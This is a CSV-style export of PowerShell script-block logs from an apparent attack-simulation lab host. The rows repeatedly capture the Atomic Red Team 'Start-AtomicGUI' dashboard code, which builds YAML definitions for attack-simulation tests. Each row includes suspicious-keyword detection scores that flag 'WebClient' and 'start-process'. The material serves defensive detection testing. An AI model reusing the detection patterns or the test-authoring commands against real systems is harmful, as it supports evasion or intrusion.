            New-UDTextBoxX ""InputArgCard$cardNumber-InputArgName"" ""Input Argument Name""
            New-UDTextAreaX ""InputArgCard$cardNumber-InputArgDescription"" ""Description""
            New-UDTextBoxX ""InputArgCard$cardNumber-InputArgDefault"" ""Default Value""
            New-UDLayout -columns 4 {
                New-UDSelect -ID ""InputArgCard$cardNumber-InputArgType"" -Label ""Type"" -Option {
                    New-UDSelectOption -Name ""Path"" -Value ""path""
                    New-UDSelectOption -Name ""String"" -Value ""string""
                    New-UDSelectOption -Name ""Url"" -Value ""url""
                    New-UDSelectOption -Name ""Integer"" -Value ""integer""
                }
            }
            New-UDButton -Text ""Remove this Input Argument""  -OnClick (
                New-UDEndpoint -Endpoint {
                    Remove-UDElement -Id ""InputArgCard$cardNumber""
                    $inputArgCards[""InputArgCard$cardNumber""] = $true
                } -ArgumentList @($cardNumber, $inputArgCards)
            )
        }
        $InputArgCards.Add(""InputArgCard$cardNumber"", $false) | Out-Null
        $newCard
    }

    $depCards = @{ }
    function New-depCard {
        $cardNumber = $depCards.count + 1
        $newCard = New-UDCard -ID ""depCard$cardNumber"" -Content {
            New-UDTextBoxX ""depCard$cardNumber-depDescription"" ""Prereq Description""
            New-UDTextAreaX ""depCard$cardNumber-prereqCommand"" ""Check prereqs Command""
            New-UDTextAreaX ""depCard$cardNumber-getPrereqCommand"" ""Get Prereqs Command""
            New-UDButton -Text ""Remove this Prereq""  -OnClick (
                New-UDEndpoint -Endpoint {
                    Remove-UDElement -Id ""depCard$cardNumber""
                    $depCards[""depCard$cardNumber""] = $true
                } -ArgumentList @($cardNumber, $depCards)
            )
        }
        $depCards.Add(""depCard$cardNumber"", $false) | Out-Null
        $newCard
    }

    function New-UDSelectX ($Id, $Label) {
        New-UDSelect -Label $Label -Id $Id -Option {
            New-UDSelectOption -Name ""PowerShell"" -Value ""PowerShell"" -Selected
            New-UDSelectOption -Name ""Command Prompt"" -Value ""CommandPrompt""
            New-UDSelectOption -Name ""Bash"" -Value ""Bash""
            New-UDSelectOption -Name ""Sh"" -Value ""Sh""
        }
    }

    ############## End Function Definitions Made Available to EndPoints

    # EndpointInitialization defining which methods, modules, and variables will be available for use within an endpoint
    $ei = New-UDEndpointInitialization `
        -Function @(""New-InputArgCard"", ""New-depCard"", ""New-UDTextAreaX"", ""New-UDTextBoxX"", ""New-UDSelectX"") `
        -Variable @(""InputArgCards"", ""depCards"", ""yaml"") `
        -Module @(""..\Invoke-AtomicRedTeam.psd1"")

    ############## EndPoint (ep) Definitions: Dynamic code called to generate content for an element or perfrom onClick actions
    $BuildAndDisplayYamlScriptBlock = {
        $testName = (Get-UDElement -Id atomicName).Attributes['value']
        $testDesc = (Get-UDElement -Id atomicDescription).Attributes['value']
        $platforms = @()
        if ((Get-UDElement -Id spWindows).Attributes['checked']) { $platforms += ""Windows"" }
        if ((Get-UDElement -Id spLinux).Attributes['checked']) { $platforms += ""Linux"" }
        if ((Get-UDElement -Id spMacOS).Attributes['checked']) { $platforms += ""macOS"" }
        $attackCommands = (Get-UDElement -Id attackCommands).Attributes['value']
        $executor = (Get-UDElement -Id executorSelector).Attributes['value']
        $elevationRequired = (Get-UDElement -Id elevationRequired).Attributes['checked']
        $cleanupCommands = (Get-UDElement -Id cleanupCommands).Attributes['value']
        if ("""" -eq $executor) { $executor = ""PowerShell"" }
        # input args
        $inputArgs = @()
        $InputArgCards.GetEnumerator() | ForEach-Object {
            if ($_.Value -eq $false) {
                # this was not deleted
                $prefix = $_.key
                $InputArgName = (Get-UDElement -Id ""$prefix-InputArgName"").Attributes['value']
                $InputArgDescription = (Get-UDElement -Id ""$prefix-InputArgDescription"").Attributes['value']
                $InputArgDefault = (Get-UDElement -Id ""$prefix-InputArgDefault"").Attributes['value']
                $InputArgType = (Get-UDElement -Id ""$prefix-InputArgType"").Attributes['value']
                if ("""" -eq $InputArgType) { $InputArgType = ""String"" }
                $NewInputArg = New-AtomicTestInputArgument -Name $InputArgName -Description $InputArgDescription -Type $InputArgType -Default $InputArgDefault -WarningVariable +warnings
                $inputArgs += $NewInputArg
            }
        }
        # dependencies
        $dependencies = @()
        $preReqEx = """"
        $depCards.GetEnumerator() | ForEach-Object {
            if ($_.Value -eq $false) {
                # a value of true means the card was deleted, so only add dependencies from non-deleted cards
                $prefix = $_.key
                $depDescription = (Get-UDElement -Id ""$prefix-depDescription"").Attributes['value']
                $prereqCommand = (Get-UDElement -Id ""$prefix-prereqCommand"").Attributes['value']
                $getPrereqCommand = (Get-UDElement -Id ""$prefix-getPrereqCommand"").Attributes['value']
                $preReqEx = (Get-UDElement -Id ""preReqEx"").Attributes['value']
                if ("""" -eq $preReqEx) { $preReqEx = ""PowerShell"" }
                $NewDep = New-AtomicTestDependency -Description $depDescription -PrereqCommand $prereqCommand -GetPrereqCommand $getPrereqCommand -WarningVariable +warnings
                $dependencies += $NewDep
            }
        }
        $depParams = @{ }
        if ($dependencies.count -gt 0) {
            $depParams.add(""DependencyExecutorType"", $preReqEx)
            $depParams.add(""Dependencies"", $dependencies)
        }
        if (($cleanupCommands -ne """") -and ($null -ne $cleanupCommands)) { $depParams.add(""ExecutorCleanupCommand"", $cleanupCommands) }
        $depParams.add(""ExecutorElevationRequired"", $elevationRequired)

        $AtomicTest = New-AtomicTest -Name $testName -Description $testDesc -SupportedPlatforms $platforms -InputArguments $inputArgs -ExecutorType $executor -ExecutorCommand $attackCommands -WarningVariable +warnings @depParams
        $yaml = ($AtomicTest | ConvertTo-Yaml) -replace ""^"", ""- "" -replace ""`n"", ""`n  ""
        foreach ($warning in $warnings) { Show-UDToast $warning -BackgroundColor LightYellow -Duration 10000 }
        New-UDElement -ID yaml -Tag pre -Content { $yaml }
    }

    $epYamlModal = New-UDEndpoint -Endpoint {
        Show-UDModal -Header { New-UDHeading -Size 3 -Text ""Test Definition YAML"" } -Content {
            new-udrow -endpoint $BuildAndDisplayYamlScriptBlock
            # Left arrow button (decrease indentation)
            New-UDButton -Icon arrow_circle_left -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    if (-not $yaml.startsWith(""- "")) {
                        Set-UDElement -Id ""yaml"" -Content {
                            $yaml -replace ""^  "", """" -replace ""`n  "", ""`n""
                        }
                    }
                }
            )
            # Right arrow button (increase indentation)
            New-UDButton -Icon arrow_circle_right -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    Set-UDElement -Id ""yaml"" -Content {
                        $yaml -replace ""^"", ""  "" -replace ""`n"", ""`n  ""
                    }
                }
            )
            # Copy Yaml to clipboard
            New-UDButton -Text ""Copy"" -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    Set-UDClipboard -Data $yaml
                    Show-UDToast -Message ""Copied YAML to the Clipboard"" -BackgroundColor YellowGreen
                }
            )
        }
    }

    $epFillTestData = New-UDEndpoint -Endpoint {
        Add-UDElement -ParentId ""inputCard"" -Content { New-InputArgCard }
        Add-UDElement -ParentId ""depCard""   -Content { New-depCard }
        Start-Sleep 1
        Set-UDElement -Id atomicName -Attributes @{value = ""My new atomic"" }
        Set-UDElement -Id atomicDescription -Attributes @{value = ""This is the atomic description"" }
        Set-UDElement -Id attackCommands -Attributes @{value = ""echo this`necho that"" }
        Set-UDElement -Id cleanupCommands -Attributes @{value = ""cleanup commands here`nand here..."" }
        # InputArgs
        $cardNumber = 1
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgName"" -Attributes @{value = ""input_arg_1"" }
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgDescription"" -Attributes @{value = ""InputArg1 description"" }
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgDefault"" -Attributes @{value = ""this is the default value"" }
        # dependencies
        Set-UDElement -Id ""depCard$cardNumber-depDescription"" -Attributes @{value = ""This file must exist"" }
        Set-UDElement -Id ""depCard$cardNumber-prereqCommand"" -Attributes @{value = ""if (this) then that"" }
        Set-UDElement -Id ""depCard$cardNumber-getPrereqCommand"" -Attributes @{value = ""iwr"" }

    }
    ############## End EndPoint (ep) Definitions

    ############## Static Definitions
    $supportedPlatforms = New-UDLayout -Columns 4 {
        New-UDElement -Tag Label -Attributes @{ style = @{""font-size"" = ""15px"" } } -Content { ""Supported Platforms:"" }
        New-UDCheckbox -FilledIn -Label ""Windows"" -Checked -Id spWindows
        New-UDCheckbox -FilledIn -Label ""Linux"" -Id spLinux
        New-UDCheckbox -FilledIn -Label ""macOS""-Id spMacOS
    }

    $executorRow = New-UDLayout -Columns 4 {
        New-UDSelectX 'executorSelector' ""Executor for Attack Commands""
        New-UDCheckbox -ID elevationRequired -FilledIn -Label ""Requires Elevation to Execute Successfully?""
    }

    $genarateYamlButton = New-UDRow -Columns {
        New-UDColumn -Size 8 -Content { }
        New-UDColumn -Size 4 -Content {
            New-UDButton -Text ""Generate Test Definition YAML"" -OnClick ( $epYamlModal )
        }
    }

    ############## End Static Definitions

    ############## The Dashboard
    $idleTimeOut = New-TimeSpan -Minutes 10080
    $db = New-UDDashboard -Title ""Atomic Test Creation"" -IdleTimeout $idleTimeOut -EndpointInitialization $ei -Content {
        New-UDCard -Id ""mainCard"" -Content {
            New-UDCard -Content {
                New-UDTextBoxX 'atomicName' ""Atomic Test Name""
                New-UDTextAreaX ""atomicDescription"" ""Atomic Test Description""
                $supportedPlatforms
                New-UDTextAreaX ""attackCommands"" ""Attack Commands""
                $executorRow
                New-UDTextAreaX ""cleanupCommands"" ""Cleanup Commands (Optional)""
                $genarateYamlButton
            }

            # input args
            New-UDCard -Id ""inputCard"" -Endpoint {
                New-UDButton -Text ""Add Input Argument (Optional)"" -OnClick (
                    New-UDEndpoint -Endpoint { Add-UDElement -ParentId ""inputCard"" -Content { New-InputArgCard } }
                )
            }

            # prereqs
            New-UDCard -Id ""depCard"" -Endpoint {
                New-UDLayout -columns 4 {
                    New-UDButton -Text ""Add Prerequisite (Optional)"" -OnClick (
                        New-UDEndpoint -Endpoint { Add-UDElement -ParentId ""depCard"" -Content { New-depCard } }
                    )
                    New-UDSelectX 'preReqEx' ""Executor for Prereq Commands""
                }
            }
        }

        # button to fill form with test data for development purposes
        if ($false) { New-UDButton -Text ""Fill Test Data"" -OnClick ( $epFillTestData ) }
    }
    ############## End of the Dashboard

    Stop-AtomicGUI
    Start-UDDashboard -port $port -Dashboard $db -Name ""AtomicGUI"" -ListenAddress 127.0.0.1
    start-process http://localhost:$port
}

function Stop-AtomicGUI {
    Get-UDDashboard -Name 'AtomicGUI' | Stop-UDDashboard
    Write-Host ""Stopped all AtomicGUI Dashboards""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'start-process'"
"12/16/2024 8:34:56 PM","35710906","7",", WebClient, Get, SuspiciousKeyword","WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]","13819","function Start-AtomicGUI {
    param (
        [Int] $port = 8487
    )
    # Install-Module UniversalDashboard if not already installed
    $UDcommunityInstalled = Get-InstalledModule -Name ""UniversalDashboard.Community"" -ErrorAction:SilentlyContinue
    $UDinstalled = Get-InstalledModule -Name ""UniversalDashboard"" -ErrorAction:SilentlyContinue
    if (-not $UDcommunityInstalled -and -not $UDinstalled) {
        Write-Host ""Installing UniversalDashboard.Community""
        Install-Module -Name UniversalDashboard.Community -Scope CurrentUser -Force
    }

    ############## Function Definitions Made Available to EndPoints
    function New-UDTextAreaX ($ID, $PlaceHolder) {
        New-UDElement -Tag div -Attributes @{class = ""input-field col"" } -Content {
            New-UDElement -Tag ""textarea"" -id  $ID -Attributes @{ class = ""materialize-textarea ud-input"" }
            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }
        }
    }

    function New-UDTextBoxX ($ID, $PlaceHolder) {
        New-UDElement -Tag div -Attributes @{class = ""input-field col"" } -Content {
            New-UDElement -Tag ""input"" -id $ID -Attributes @{ class = ""ud-input""; type = ""text"" }
            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }
        }
    }

    $InputArgCards = @{ }
    function New-InputArgCard {
        $cardNumber = $InputArgCards.count + 1
        $newCard = New-UDCard -ID ""InputArgCard$cardNumber"" -Content {
            New-UDTextBoxX ""InputArgCard$cardNumber-InputArgName"" ""Input Argument Name""
            New-UDTextAreaX ""InputArgCard$cardNumber-InputArgDescription"" ""Description""
            New-UDTextBoxX ""InputArgCard$cardNumber-InputArgDefault"" ""Default Value""
            New-UDLayout -columns 4 {
                New-UDSelect -ID ""InputArgCard$cardNumber-InputArgType"" -Label ""Type"" -Option {
                    New-UDSelectOption -Name ""Path"" -Value ""path""
                    New-UDSelectOption -Name ""String"" -Value ""string""
                    New-UDSelectOption -Name ""Url"" -Value ""url""
                    New-UDSelectOption -Name ""Integer"" -Value ""integer""
                }
            }
            New-UDButton -Text ""Remove this Input Argument""  -OnClick (
                New-UDEndpoint -Endpoint {
                    Remove-UDElement -Id ""InputArgCard$cardNumber""
                    $inputArgCards[""InputArgCard$cardNumber""] = $true
                } -ArgumentList @($cardNumber, $inputArgCards)
            )
        }
        $InputArgCards.Add(""InputArgCard$cardNumber"", $false) | Out-Null
        $newCard
    }

    $depCards = @{ }
    function New-depCard {
        $cardNumber = $depCards.count + 1
        $newCard = New-UDCard -ID ""depCard$cardNumber"" -Content {
            New-UDTextBoxX ""depCard$cardNumber-depDescription"" ""Prereq Description""
            New-UDTextAreaX ""depCard$cardNumber-prereqCommand"" ""Check prereqs Command""
            New-UDTextAreaX ""depCard$cardNumber-getPrereqCommand"" ""Get Prereqs Command""
            New-UDButton -Text ""Remove this Prereq""  -OnClick (
                New-UDEndpoint -Endpoint {
                    Remove-UDElement -Id ""depCard$cardNumber""
                    $depCards[""depCard$cardNumber""] = $true
                } -ArgumentList @($cardNumber, $depCards)
            )
        }
        $depCards.Add(""depCard$cardNumber"", $false) | Out-Null
        $newCard
    }

    function New-UDSelectX ($Id, $Label) {
        New-UDSelect -Label $Label -Id $Id -Option {
            New-UDSelectOption -Name ""PowerShell"" -Value ""PowerShell"" -Selected
            New-UDSelectOption -Name ""Command Prompt"" -Value ""CommandPrompt""
            New-UDSelectOption -Name ""Bash"" -Value ""Bash""
            New-UDSelectOption -Name ""Sh"" -Value ""Sh""
        }
    }

    ############## End Function Definitions Made Available to EndPoints

    # EndpointInitialization defining which methods, modules, and variables will be available for use within an endpoint
    $ei = New-UDEndpointInitialization `
        -Function @(""New-InputArgCard"", ""New-depCard"", ""New-UDTextAreaX"", ""New-UDTextBoxX"", ""New-UDSelectX"") `
        -Variable @(""InputArgCards"", ""depCards"", ""yaml"") `
        -Module @(""..\Invoke-AtomicRedTeam.psd1"")

    ############## EndPoint (ep) Definitions: Dynamic code called to generate content for an element or perfrom onClick actions
    $BuildAndDisplayYamlScriptBlock = {
        $testName = (Get-UDElement -Id atomicName).Attributes['value']
        $testDesc = (Get-UDElement -Id atomicDescription).Attributes['value']
        $platforms = @()
        if ((Get-UDElement -Id spWindows).Attributes['checked']) { $platforms += ""Windows"" }
        if ((Get-UDElement -Id spLinux).Attributes['checked']) { $platforms += ""Linux"" }
        if ((Get-UDElement -Id spMacOS).Attributes['checked']) { $platforms += ""macOS"" }
        $attackCommands = (Get-UDElement -Id attackCommands).Attributes['value']
        $executor = (Get-UDElement -Id executorSelector).Attributes['value']
        $elevationRequired = (Get-UDElement -Id elevationRequired).Attributes['checked']
        $cleanupCommands = (Get-UDElement -Id cleanupCommands).Attributes['value']
        if ("""" -eq $executor) { $executor = ""PowerShell"" }
        # input args
        $inputArgs = @()
        $InputArgCards.GetEnumerator() | ForEach-Object {
            if ($_.Value -eq $false) {
                # this was not deleted
                $prefix = $_.key
                $InputArgName = (Get-UDElement -Id ""$prefix-InputArgName"").Attributes['value']
                $InputArgDescription = (Get-UDElement -Id ""$prefix-InputArgDescription"").Attributes['value']
                $InputArgDefault = (Get-UDElement -Id ""$prefix-InputArgDefault"").Attributes['value']
                $InputArgType = (Get-UDElement -Id ""$prefix-InputArgType"").Attributes['value']
                if ("""" -eq $InputArgType) { $InputArgType = ""String"" }
                $NewInputArg = New-AtomicTestInputArgument -Name $InputArgName -Description $InputArgDescription -Type $InputArgType -Default $InputArgDefault -WarningVariable +warnings
                $inputArgs += $NewInputArg
            }
        }
        # dependencies
        $dependencies = @()
        $preReqEx = """"
        $depCards.GetEnumerator() | ForEach-Object {
            if ($_.Value -eq $false) {
                # a value of true means the card was deleted, so only add dependencies from non-deleted cards
                $prefix = $_.key
                $depDescription = (Get-UDElement -Id ""$prefix-depDescription"").Attributes['value']
                $prereqCommand = (Get-UDElement -Id ""$prefix-prereqCommand"").Attributes['value']
                $getPrereqCommand = (Get-UDElement -Id ""$prefix-getPrereqCommand"").Attributes['value']
                $preReqEx = (Get-UDElement -Id ""preReqEx"").Attributes['value']
                if ("""" -eq $preReqEx) { $preReqEx = ""PowerShell"" }
                $NewDep = New-AtomicTestDependency -Description $depDescription -PrereqCommand $prereqCommand -GetPrereqCommand $getPrereqCommand -WarningVariable +warnings
                $dependencies += $NewDep
            }
        }
        $depParams = @{ }
        if ($dependencies.count -gt 0) {
            $depParams.add(""DependencyExecutorType"", $preReqEx)
            $depParams.add(""Dependencies"", $dependencies)
        }
        if (($cleanupCommands -ne """") -and ($null -ne $cleanupCommands)) { $depParams.add(""ExecutorCleanupCommand"", $cleanupCommands) }
        $depParams.add(""ExecutorElevationRequired"", $elevationRequired)

        $AtomicTest = New-AtomicTest -Name $testName -Description $testDesc -SupportedPlatforms $platforms -InputArguments $inputArgs -ExecutorType $executor -ExecutorCommand $attackCommands -WarningVariable +warnings @depParams
        $yaml = ($AtomicTest | ConvertTo-Yaml) -replace ""^"", ""- "" -replace ""`n"", ""`n  ""
        foreach ($warning in $warnings) { Show-UDToast $warning -BackgroundColor LightYellow -Duration 10000 }
        New-UDElement -ID yaml -Tag pre -Content { $yaml }
    }

    $epYamlModal = New-UDEndpoint -Endpoint {
        Show-UDModal -Header { New-UDHeading -Size 3 -Text ""Test Definition YAML"" } -Content {
            new-udrow -endpoint $BuildAndDisplayYamlScriptBlock
            # Left arrow button (decrease indentation)
            New-UDButton -Icon arrow_circle_left -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    if (-not $yaml.startsWith(""- "")) {
                        Set-UDElement -Id ""yaml"" -Content {
                            $yaml -replace ""^  "", """" -replace ""`n  "", ""`n""
                        }
                    }
                }
            )
            # Right arrow button (increase indentation)
            New-UDButton -Icon arrow_circle_right -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    Set-UDElement -Id ""yaml"" -Content {
                        $yaml -replace ""^"", ""  "" -replace ""`n"", ""`n  ""
                    }
                }
            )
            # Copy Yaml to clipboard
            New-UDButton -Text ""Copy"" -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    Set-UDClipboard -Data $yaml
                    Show-UDToast -Message ""Copied YAML to the Clipboard"" -BackgroundColor YellowGreen
                }
            )
        }
    }

    $epFillTestData = New-UDEndpoint -Endpoint {
        Add-UDElement -ParentId ""inputCard"" -Content { New-InputArgCard }
        Add-UDElement -ParentId ""depCard""   -Content { New-depCard }
        Start-Sleep 1
        Set-UDElement -Id atomicName -Attributes @{value = ""My new atomic"" }
        Set-UDElement -Id atomicDescription -Attributes @{value = ""This is the atomic description"" }
        Set-UDElement -Id attackCommands -Attributes @{value = ""echo this`necho that"" }
        Set-UDElement -Id cleanupCommands -Attributes @{value = ""cleanup commands here`nand here..."" }
        # InputArgs
        $cardNumber = 1
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgName"" -Attributes @{value = ""input_arg_1"" }
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgDescription"" -Attributes @{value = ""InputArg1 description"" }
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgDefault"" -Attributes @{value = ""this is the default value"" }
        # dependencies
        Set-UDElement -Id ""depCard$cardNumber-depDescription"" -Attributes @{value = ""This file must exist"" }
        Set-UDElement -Id ""depCard$cardNumber-prereqCommand"" -Attributes @{value = ""if (this) then that"" }
        Set-UDElement -Id ""depCard$cardNumber-getPrereqCommand"" -Attributes @{value = ""iwr"" }

    }
    ############## End EndPoint (ep) Definitions

    ############## Static Definitions
    $supportedPlatforms = New-UDLayout -Columns 4 {
        New-UDElement -Tag Label -Attributes @{ style = @{""font-size"" = ""15px"" } } -Content { ""Supported Platforms:"" }
        New-UDCheckbox -FilledIn -Label ""Windows"" -Checked -Id spWindows
        New-UDCheckbox -FilledIn -Label ""Linux"" -Id spLinux
        New-UDCheckbox -FilledIn -Label ""macOS""-Id spMacOS
    }

    $executorRow = New-UDLayout -Columns 4 {
        New-UDSelectX 'executorSelector' ""Executor for Attack Commands""
        New-UDCheckbox -ID elevationRequired -FilledIn -Label ""Requires Elevation to Execute Successfully?""
    }

    $genarateYamlButton = New-UDRow -Columns {
        New-UDColumn -Size 8 -Content { }
        New-UDColumn -Size 4 -Content {
            New-UDButton -Text ""Generate Test Definition YAML"" -OnClick ( $epYamlModal )
        }
    }

    ############## End Static Definitions

    ############## The Dashboard
    $idleTimeOut = New-TimeSpan -Minutes 10080
    $db = New-UDDashboard -Title ""Atomic Test Creation"" -IdleTimeout $idleTimeOut -EndpointInitialization $ei -Content {
        New-UDCard -Id ""mainCard"" -Content {
            New-UDCard -Content {
                New-UDTextBoxX 'atomicName' ""Atomic Test Name""
                New-UDTextAreaX ""atomicDescription"" ""Atomic Test Description""
                $supportedPlatforms
                New-UDTextAreaX ""attackCommands"" ""Attack Commands""
                $executorRow
                New-UDTextAreaX ""cleanupCommands"" ""Cleanup Commands (Optional)""
                $genarateYamlButton
            }

            # input args
            New-UDCard -Id ""inputCard"" -Endpoint {
                New-UDButton -Text ""Add Input Argument (Optional)"" -OnClick (
                    New-UDEndpoint -Endpoint { Add-UDElement -ParentId ""inputCard"" -Content { New-InputArgCard } }
                )
            }

            # prereqs
            New-UDCard -Id ""depCard"" -Endpoint {
                New-UDLayout -columns 4 {
                    New-UDButton -Text ""Add Prerequisite (Optional)"" -OnClick (
                        New-UDEndpoint -Endpoint { Add-UDElement -ParentId ""depCard"" -Content { New-depCard } }
                    )
                    New-UDSelectX 'preReqEx' ""Executor for Prereq Commands""
                }
            }
        }

        # button to fill form with test data for development purposes
        if ($false) { New-UDButton -Text ""Fill Test Data"" -OnClick ( $epFillTestData ) }
    }
    ############## End of the Dashboard

    Stop-AtomicGUI
    Start-UDDashboard -port $port -Dashboard $db -Name ""AtomicGUI"" -ListenAddress 127.0.0.1
    start-process http://localhost:$port
}

function Stop-AtomicGUI {
    Get-UDDashboard -Name 'AtomicGUI' | Stop-UDDashboard
    Write-Host ""Stopped all AtomicGUI Dashboards""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'start-process'"
"12/16/2024 8:34:55 PM","35710715","7",", WebClient, Get, SuspiciousKeyword","WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]","13819","function Start-AtomicGUI {
    param (
        [Int] $port = 8487
    )
    # Install-Module UniversalDashboard if not already installed
    $UDcommunityInstalled = Get-InstalledModule -Name ""UniversalDashboard.Community"" -ErrorAction:SilentlyContinue
    $UDinstalled = Get-InstalledModule -Name ""UniversalDashboard"" -ErrorAction:SilentlyContinue
    if (-not $UDcommunityInstalled -and -not $UDinstalled) {
        Write-Host ""Installing UniversalDashboard.Community""
        Install-Module -Name UniversalDashboard.Community -Scope CurrentUser -Force
    }

    ############## Function Definitions Made Available to EndPoints
    function New-UDTextAreaX ($ID, $PlaceHolder) {
        New-UDElement -Tag div -Attributes @{class = ""input-field col"" } -Content {
            New-UDElement -Tag ""textarea"" -id  $ID -Attributes @{ class = ""materialize-textarea ud-input"" }
            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }
        }
    }

    function New-UDTextBoxX ($ID, $PlaceHolder) {
        New-UDElement -Tag div -Attributes @{class = ""input-field col"" } -Content {
            New-UDElement -Tag ""input"" -id $ID -Attributes @{ class = ""ud-input""; type = ""text"" }
            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }
        }
    }

    $InputArgCards = @{ }
    function New-InputArgCard {
        $cardNumber = $InputArgCards.count + 1
        $newCard = New-UDCard -ID ""InputArgCard$cardNumber"" -Content {
            New-UDTextBoxX ""InputArgCard$cardNumber-InputArgName"" ""Input Argument Name""
            New-UDTextAreaX ""InputArgCard$cardNumber-InputArgDescription"" ""Description""
            New-UDTextBoxX ""InputArgCard$cardNumber-InputArgDefault"" ""Default Value""
            New-UDLayout -columns 4 {
                New-UDSelect -ID ""InputArgCard$cardNumber-InputArgType"" -Label ""Type"" -Option {
                    New-UDSelectOption -Name ""Path"" -Value ""path""
                    New-UDSelectOption -Name ""String"" -Value ""string""
                    New-UDSelectOption -Name ""Url"" -Value ""url""
                    New-UDSelectOption -Name ""Integer"" -Value ""integer""
                }
            }
            New-UDButton -Text ""Remove this Input Argument""  -OnClick (
                New-UDEndpoint -Endpoint {
                    Remove-UDElement -Id ""InputArgCard$cardNumber""
                    $inputArgCards[""InputArgCard$cardNumber""] = $true
                } -ArgumentList @($cardNumber, $inputArgCards)
            )
        }
        $InputArgCards.Add(""InputArgCard$cardNumber"", $false) | Out-Null
        $newCard
    }

    $depCards = @{ }
    function New-depCard {
        $cardNumber = $depCards.count + 1
        $newCard = New-UDCard -ID ""depCard$cardNumber"" -Content {
            New-UDTextBoxX ""depCard$cardNumber-depDescription"" ""Prereq Description""
            New-UDTextAreaX ""depCard$cardNumber-prereqCommand"" ""Check prereqs Command""
            New-UDTextAreaX ""depCard$cardNumber-getPrereqCommand"" ""Get Prereqs Command""
            New-UDButton -Text ""Remove this Prereq""  -OnClick (
                New-UDEndpoint -Endpoint {
                    Remove-UDElement -Id ""depCard$cardNumber""
                    $depCards[""depCard$cardNumber""] = $true
                } -ArgumentList @($cardNumber, $depCards)
            )
        }
        $depCards.Add(""depCard$cardNumber"", $false) | Out-Null
        $newCard
    }

    function New-UDSelectX ($Id, $Label) {
        New-UDSelect -Label $Label -Id $Id -Option {
            New-UDSelectOption -Name ""PowerShell"" -Value ""PowerShell"" -Selected
            New-UDSelectOption -Name ""Command Prompt"" -Value ""CommandPrompt""
            New-UDSelectOption -Name ""Bash"" -Value ""Bash""
            New-UDSelectOption -Name ""Sh"" -Value ""Sh""
        }
    }

    ############## End Function Definitions Made Available to EndPoints

    # EndpointInitialization defining which methods, modules, and variables will be available for use within an endpoint
    $ei = New-UDEndpointInitialization `
        -Function @(""New-InputArgCard"", ""New-depCard"", ""New-UDTextAreaX"", ""New-UDTextBoxX"", ""New-UDSelectX"") `
        -Variable @(""InputArgCards"", ""depCards"", ""yaml"") `
        -Module @(""..\Invoke-AtomicRedTeam.psd1"")

    ############## EndPoint (ep) Definitions: Dynamic code called to generate content for an element or perfrom onClick actions
    $BuildAndDisplayYamlScriptBlock = {
        $testName = (Get-UDElement -Id atomicName).Attributes['value']
        $testDesc = (Get-UDElement -Id atomicDescription).Attributes['value']
        $platforms = @()
        if ((Get-UDElement -Id spWindows).Attributes['checked']) { $platforms += ""Windows"" }
        if ((Get-UDElement -Id spLinux).Attributes['checked']) { $platforms += ""Linux"" }
        if ((Get-UDElement -Id spMacOS).Attributes['checked']) { $platforms += ""macOS"" }
        $attackCommands = (Get-UDElement -Id attackCommands).Attributes['value']
        $executor = (Get-UDElement -Id executorSelector).Attributes['value']
        $elevationRequired = (Get-UDElement -Id elevationRequired).Attributes['checked']
        $cleanupCommands = (Get-UDElement -Id cleanupCommands).Attributes['value']
        if ("""" -eq $executor) { $executor = ""PowerShell"" }
        # input args
        $inputArgs = @()
        $InputArgCards.GetEnumerator() | ForEach-Object {
            if ($_.Value -eq $false) {
                # this was not deleted
                $prefix = $_.key
                $InputArgName = (Get-UDElement -Id ""$prefix-InputArgName"").Attributes['value']
                $InputArgDescription = (Get-UDElement -Id ""$prefix-InputArgDescription"").Attributes['value']
                $InputArgDefault = (Get-UDElement -Id ""$prefix-InputArgDefault"").Attributes['value']
                $InputArgType = (Get-UDElement -Id ""$prefix-InputArgType"").Attributes['value']
                if ("""" -eq $InputArgType) { $InputArgType = ""String"" }
                $NewInputArg = New-AtomicTestInputArgument -Name $InputArgName -Description $InputArgDescription -Type $InputArgType -Default $InputArgDefault -WarningVariable +warnings
                $inputArgs += $NewInputArg
            }
        }
        # dependencies
        $dependencies = @()
        $preReqEx = """"
        $depCards.GetEnumerator() | ForEach-Object {
            if ($_.Value -eq $false) {
                # a value of true means the card was deleted, so only add dependencies from non-deleted cards
                $prefix = $_.key
                $depDescription = (Get-UDElement -Id ""$prefix-depDescription"").Attributes['value']
                $prereqCommand = (Get-UDElement -Id ""$prefix-prereqCommand"").Attributes['value']
                $getPrereqCommand = (Get-UDElement -Id ""$prefix-getPrereqCommand"").Attributes['value']
                $preReqEx = (Get-UDElement -Id ""preReqEx"").Attributes['value']
                if ("""" -eq $preReqEx) { $preReqEx = ""PowerShell"" }
                $NewDep = New-AtomicTestDependency -Description $depDescription -PrereqCommand $prereqCommand -GetPrereqCommand $getPrereqCommand -WarningVariable +warnings
                $dependencies += $NewDep
            }
        }
        $depParams = @{ }
        if ($dependencies.count -gt 0) {
            $depParams.add(""DependencyExecutorType"", $preReqEx)
